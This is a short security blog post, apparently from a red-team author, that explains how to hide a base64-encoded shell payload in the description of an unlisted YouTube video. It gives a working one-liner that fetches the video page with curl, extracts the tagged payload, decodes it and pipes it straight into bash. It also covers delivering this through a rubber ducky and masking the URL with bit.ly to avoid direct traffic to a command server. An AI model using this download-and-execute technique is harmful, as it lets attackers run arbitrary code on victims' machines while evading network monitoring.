---
layout: post
title: Hosting malicious payloads on Youtube
description: Use Youtube to host your malicious payloads
keywords: payload,youtube,shell 
disqus: true
tags: [TRICKS]
categories: RCE 
---
#### Why that? 
It's a trick created during a red team mission, where we have a rubber ducky, which will download a bash script to run the [GTRS](https://github.com/mthbernardes/GTRS) on the victm machine, but we have problem, the traffic with the C2 will be safe using the [GTRS](https://github.com/mthbernardes/GTRS), but the infected machine need to talk directly to the C2 to get our payload, so we had the idea to use Youtube to host our bash payload.

### Recipe of Rataria
First of all, create your payload with powershell, bash, python or whatever language you want, then encode it in base64.

```bash
base64 -w0 payload
```

Now upload a video on youtube, make it unlisted and on the video description insert your payload encoded, BUT to make your life easier add a tag at the start and end of the payload, like this, `sCmD[YOUPAYLOAD]eCmD`, and that's all, now all you need is execute this command on your rubber ducky payload

```bash
curl https://www.youtube.com/watch?v=VIDEOID | sed -n 's/.*sCmD\(.*\)eCmD.*/\1/p' | base64 -d | bash
```

A tip to shrink the url, is use [bit.ly](https://bit.ly) which is used by twitter.
